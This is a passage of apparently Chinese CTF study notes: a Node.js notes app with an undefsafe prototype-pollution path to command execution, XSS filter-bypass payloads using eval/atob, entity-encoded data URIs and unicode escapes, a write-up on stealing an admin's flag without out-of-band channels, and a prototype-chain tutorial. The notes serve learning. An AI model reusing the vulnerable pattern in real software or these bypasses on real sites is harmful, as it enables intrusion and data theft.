&#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        <span class="title function_">undefsafe</span>(r, id, <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_all_notes</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">note_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">remove_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">note_list</span>[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> <span class="title class_">Notes</span>();</span><br><span class="line">notes.<span class="title function_">write_note</span>(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);    <span class="comment">// 设置模板引擎为pug</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> raw = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.<span class="title function_">write_note</span>(author, raw);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)    <span class="comment">// 该路由中 undefsafe 三个参数均可控</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.<span class="title function_">remove_note</span>(id);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_all_notes</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_note</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)    <span class="comment">// 漏洞点，只要将字典 commands 给污染了, 就能任意执行我们的命令</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);    <span class="comment">// 将命令执行结果输出</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><h2 id="为什么不是write-note"><a href="#为什么不是write-note" class="headerlink" title="*为什么不是write_note?"></a>*为什么不是write_note?</h2><ol><li>这里不行，就算传入<code>__proto__</code>也无法污染原型链，而是直接替换对象，只有在<code>undefsafe()</code>中才可以添加属性进行污染</li></ol><h2 id="undefsafe的原型链污染"><a href="#undefsafe的原型链污染" class="headerlink" title="*undefsafe的原型链污染"></a>*undefsafe的原型链污染</h2><ol><li>介绍：Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性</li><li>速记<ol><li>低版本&lt;2.0.3</li><li>undefsafe用来修改&#x2F;添加属性时防止报错</li><li>2.0.3一下如果当属性不存在时，我们想对该属性赋值，访问属性会在上层进行创建并赋值</li></ol></li><li><a href="https://www.anquanke.com/post/id/242645">例子</a></li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>直接见script notes_wangding20</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss_payload</title>
      <link href="/2024/10/30/xss_payload/"/>
      <url>/2024/10/30/xss_payload/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://xz.aliyun.com/t/12890?time__1311=GqGxuDc7iQGQitD/Y2PBKq2UiA+2AEbD">xss进阶原理</a></li></ol><h2 id="T00ls"><a href="#T00ls" class="headerlink" title="T00ls"></a>T00ls</h2><h2 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h2><ol><li>带外，一般不行不出网</li><li>cookie，需要cookie不是httponly</li><li><strong>写入载体</strong></li></ol><h2 id="关键词黑名单"><a href="#关键词黑名单" class="headerlink" title="关键词黑名单"></a>关键词黑名单</h2><ol><li><p>执行代码<code>window[&#39;eval&#39;](atob(data))</code></p><ol><li>绕过安全检查：有些网站或应用可能会禁用或重写 eval 函数以防止潜在的安全风险。通过使用 <code>window[&#39;eval&#39;]</code>，攻击者可以尝试绕过这种检查</li><li>使用<code>atob(data)</code>进行base64解码</li></ol></li><li><p>实体编码绕过</p><ol><li>可以识别出是<code>data:text/javascript;base64,</code>，有条件还是本地多试试</li><li>详见绕过原理中的<code>html解码和js解码</code></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>自动闭合特性：可以用于绕过一些正则表达式</p></li></ol><h2 id="一些绕过原理"><a href="#一些绕过原理" class="headerlink" title="一些绕过原理"></a>一些绕过原理</h2><h3 id="html解码和js解码"><a href="#html解码和js解码" class="headerlink" title="html解码和js解码"></a>html解码和js解码</h3><ol><li>解码顺序<ol><li>一般情况下，解码顺序是按照HTML实体化解码–&gt;JavaScript解码进行的</li></ol></li><li>HTML实体化解码<ol><li>如果服务器与客户端之间要传输某个特殊字符，像是<code>&lt;&gt;，&#39;</code>等这类会被当做标签或者属性值等来解析的字符，为了避免歧义就需要使用到HTML实体化编码来进行编码了。</li><li>HTML编码的几种方式<ol><li>别名形式：因为比较多可以见(w3school.com.cn)</li><li>十六进制：像<code>&lt;div&gt;</code>就会被编码为<code>&amp;#x003c;&amp;#x0064;&amp;#x0069;&amp;#x0076;&amp;#x003e;</code></li><li>十进制：上述标签在十进制会被编码为<code>&amp;#60;&amp;#100;&amp;#105;&amp;#118;&amp;#62;</code></li></ol></li></ol></li><li>为什么需要JavaScript解码？<ol><li>通过JavaScript编码，可以对特殊字符进行转义，防止数据在传输过程中产生语法错误或安全漏洞。例如，对于包含特殊字符（如引号、尖括号等）的数据，可以使用转义字符进行编码，以确保数据的完整性和安全性。</li></ol></li><li><em><strong>明明有了HTML实体化编码为什么是还需要JavaScript编码</strong></em><ol><li><p>在HTML进行解析的时候，遇到了<code>&lt;script&gt;</code>标签或者事件属性或者URL协议时就会使用到JS编码来对JS代码当中的特殊字符如<code>：&#39;，&quot;</code>进行编码操作。</p></li><li><p>JS编码有哪些方式？</p><ol><li>以\uxxxx，\UXXXXXXXX，\xXX都是JavaScript编码</li><li>但是注意：某些特殊字符不能够进行JavaScript编码，否则浏览器无法进行解析，如<code>&lt; &gt; &#39; &quot; ( )</code><ol><li>特别的：<code>&lt;svg&gt;</code>当中包裹的标签将特殊字符进行编码时可以进行解析</li></ol></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="comment">// js编码后</span></span><br><span class="line">&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074(\u0031)&gt;</span><br><span class="line">// 因为()要进行保留，所以不是以下</span><br><span class="line">&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074\u0031&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码脚本如下</span></span><br><span class="line"><span class="comment"># 原始字符串</span></span><br><span class="line">encoded_string = <span class="string">&#x27;&lt;img src=# onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 Unicode 转义序列</span></span><br><span class="line">decoded_string = encoded_string.encode().decode(<span class="string">&#x27;unicode-escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web02_网鼎24</title>
      <link href="/2024/10/29/web02_%E7%BD%91%E9%BC%8E24/"/>
      <url>/2024/10/29/web02_%E7%BD%91%E9%BC%8E24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>也是更新我对带外的思考了</p></blockquote><h2 id="越权与带外"><a href="#越权与带外" class="headerlink" title="越权与带外"></a>越权与带外</h2><blockquote><p>没见过这种，开辟新思路了，还是做题不够多</p></blockquote><ol><li>没搞出来，dy牛，分析一下</li><li>第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样</li><li>一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有访问控制</li><li><em><strong>这里就来到今天的重点了</strong></em><ol><li>引入一个<strong>信道概念</strong>，从本质上看与网站交互的信道是单条的，带外是为了自己引进，如果带外不行的话，那如何在单条信道获取信息 -&gt; 对方返回的内容，这里最明显的就是todo，接下来就是要让对方携带cookie返回在todo里面</li><li><strong>访问控制</strong>: todo可以通过post进行修改，而且注意到每一个content都有一个对于的id -&gt; 通过boss可以访问到&#x2F;flag，然后插入到我的页面</li><li>payload: web02_js&#x2F;py_wangding24</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS原型链污染速通</title>
      <link href="/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/"/>
      <url>/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="1-DONE-Js中函数也是对象啊，他们的原型链怎么办"><a href="#1-DONE-Js中函数也是对象啊，他们的原型链怎么办" class="headerlink" title="1. DONE: Js中函数也是对象啊，他们的原型链怎么办?"></a>1. DONE: Js中函数也是对象啊，他们的原型链怎么办?</h3><ol><li>对于构造函数，更加准确是使用new调用时，func.prototype才能发挥他特有的作用，否则只是一个普通的属性</li><li><code>Constructor.prototype</code> 仅在构造实例时有用。它与 <code>Constructor.[[Prototype]]</code> 无关，后者是构造函数的自有原型，即 Function.prototype。也就是说，Object.getPrototypeOf(Constructor) &#x3D;&#x3D;&#x3D; Function.prototype</li></ol><h3 id="2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事"><a href="#2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事" class="headerlink" title="*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?"></a>*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?</h3><ol><li><p>默认情况下，构造函数的 prototype 是一个普通的对象，它的<code>[[Prototype]]</code>指向 Object.prototype</p><ol><li>普通对象的 <code>[[Prototype]]</code> 指向 Object.prototype。这是 JavaScript 中原型链机制的一个基本特性。每个通过<em><strong>对象字面量</strong></em>或***new Object()***创建的对象，默认情况下其内部 <code>[[Prototype]]</code>链接（即 <code>__proto__</code>）指向 Object.prototype</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的调用链</span></span><br><span class="line">obj ---&gt; <span class="title class_">Constructor</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="literal">null</span></span><br><span class="line"><span class="comment">// 可以通过调用链进行解决</span></span><br></pre></td></tr></table></figure></li><li><p>内置构造函数</p><ol><li>一些内置构造函数的 prototype 属性本身就是其自身的实例。例如，Number.prototype 是数字 0，Array.prototype 是一个空数组，RegExp.prototype 是 <code>/(?:)/</code></li><li>唯一的例外是 Object.prototype 本身，它的 <code>[[Prototype]]</code> 是 null</li></ol></li></ol><h3 id="3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗"><a href="#3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗" class="headerlink" title="*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?"></a>*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?</h3><ol><li>构造函数中prototype总是会默认有一个同对象，当你改变构造函数的 prototype 属性后，之前创建的实例和之后创建的实例将有不同的 <code>[[Prototype]]</code>。这是因为每个实例对象的 <code>[[Prototype]]</code> 在创建时就已经被设置，并且不会随着构造函数 prototype 属性的变化而变化</li><li>通过同一个构造函数构造的对象的 <code>[[Prototype]]</code> 是同一个对象。所有通过同一个构造函数创建的实例共享同一个原型对象，但是修改(这里的修改不是说添加而是指向另一个对象，<strong>地址不同</strong>)不是“同步”进行的，指向了不同的对象 -&gt; 原来的对象还可以访问，垃圾收集器不会处理</li></ol><h3 id="4-DONE-是否会造成无限循环的问题？"><a href="#4-DONE-是否会造成无限循环的问题？" class="headerlink" title="*4. DONE: 是否会造成无限循环的问题？"></a>*4. DONE: 是否会造成无限循环的问题？</h3><ol><li><p>有一种情况，如下，见注释即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">b</span>=&#123;<span class="string">&quot;AAA&quot;</span>: <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="comment">// Object有b属性，而b的原型是Object吗？在浏览器中看起来像是创建了无数个对象</span></span><br><span class="line"><span class="comment">// 但是实际上并没有</span></span><br><span class="line">   <span class="comment">// 从原型链的角度看一直是b -&gt; Object -&gt; null；a -&gt;&gt; Object -&gt; null</span></span><br><span class="line">   <span class="comment">// 从对象角度来看始终只有三个对象，一个就是b，一个就是a还有Object</span></span><br><span class="line">      <span class="comment">/*      a ——&gt; b &lt;——&gt; Object &lt;——</span></span><br><span class="line"><span class="comment">       *     |                      | </span></span><br><span class="line"><span class="comment">       *     | —— —— —— —— —— —— —— |   </span></span><br><span class="line"><span class="comment">       */</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Js原型链基础"><a href="#Js原型链基础" class="headerlink" title="Js原型链基础"></a>Js原型链基础</h2><h3 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h3><ol><li>getter和setter<ol><li>一种语法：通过调用属性的方法来隐式调用一组函数</li><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Working_with_objects#%E5%AE%9A%E4%B9%89_getter_%E4%B8%8E_setter">mdn getter和setter</a></li></ol></li><li>js原型链<ol><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">还是mdn，绝了，web手必备</a></li><li>!!! Notice 流程详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">有创建一个原型的详细流程</a></li><li>核心思想：基于对象的链而非类的链；对象方法基于this；<strong>动态实时改变的</strong></li><li>第一次看的时候被混淆的几个点<ol><li><code>someObject.[[Prototype]]</code> 用于标识 someObject 的原型 -&gt; 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 函数来访问</li><li><strong>设置<code>[[Prototype]]</code></strong>: <code>&#123; __proto__: ... &#125;</code> 语法与 <code>obj.__proto__</code> 访问器不同：前者是标准且未被弃用，后者则是被许多js引擎实现的原型setter和getter(非标准并逐步弃用)<ol><li><code>&#123; __proto__: ... &#125;</code> 是一种对象字面量语法，允许你在创建对象时指定其原型(这里不是getter和setter)。这是 ES5 引入的一个非标准特性，后来在 ES6 中被标准化为一个正式的语言特性</li></ol></li><li><strong>构造函数的.prototype属性</strong>: 构造函数可以**指定(自定义)**一个有特殊含义的属性prototype -&gt; 当你定义一个构造函数时，JavaScript 会自动为这个构造函数创建一个 prototype 对象。这个原型对象默认有一个 constructor 属性，指向构造函数本身<code>Person.prototype.constructor===Person</code><ol><li>有什么用呢？通过构造函数创建的每一个实例都会自动将构造函数的 prototype 属性作为其 <code>[[Prototype]]</code> -&gt; 是自动通过this实现的，特殊情况：如果构造函数返回非原始值而是一个新对象时，则该值将成为 new 表达式的结果。在这种情况下，<code>[[Prototype]]</code> 可能无法正确绑定——但在实践中应该很少发生</li><li><code>obj.constructor</code>:(会通过原型链寻找)的作用在于追踪到构造函数，一些内置操作也会读取 constructor 属性，如果没有设置，它们可能无法按预期工作</li></ol></li></ol></li></ol></li></ol><h3 id="类是构造函数语法糖"><a href="#类是构造函数语法糖" class="headerlink" title="类是构造函数语法糖"></a>类是构造函数语法糖</h3><ol><li>js中的类<ol><li>简单了解：可以暂时理解为类是构造函数的语法糖，这意味着你仍然可以修改 Box.prototype 来改变所有实例的行为</li></ol></li><li>Dive into<ol><li><code>alert(typeof Classname)</code>显示为function</li><li>函数转换示例<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/%E5%87%BD%E6%95%B0%E8%BD%AC%E6%8D%A2.png" alt="理解"><ol><li>转换为对于Classname()函数prototype属性的内容，<code>User.prototype.constrcutor===User</code></li></ol></li><li><a href="https://zh.javascript.info/class">see more in 现代js教程</a></li></ol></li></ol><h2 id="Js原型链污染"><a href="#Js原型链污染" class="headerlink" title="Js原型链污染"></a>Js原型链污染</h2><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><ol><li>快速上手<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">离别歌yyds</a></li></ol><h3 id="与问题3进行区分与原理解释"><a href="#与问题3进行区分与原理解释" class="headerlink" title="*与问题3进行区分与原理解释"></a>*与问题3进行区分与原理解释</h3><ol><li><p>在js中对象是通过地址进行区分的，里面的修改是指指向另一个新的对象(新的地址)，而原来的地址已经定下来而且没有被垃圾回收</p></li><li><p>原型链污染可以是建立在指向同一个原型的情况下<strong>添加属性&#x2F;函数</strong>进行污染</p></li><li><p>原型链污染示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此例子无法进行原型链污染，只能修改对象的__proto__</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">   <span class="comment">// 建立后的__proto__指向是本身的[[Prototype]]，改变了[[Prototype]]的指向</span></span><br><span class="line"><span class="keyword">let</span> o2 = &#123;&#125;</span><br><span class="line">o2.<span class="property">a</span>  <span class="comment">// 显示undefined</span></span><br><span 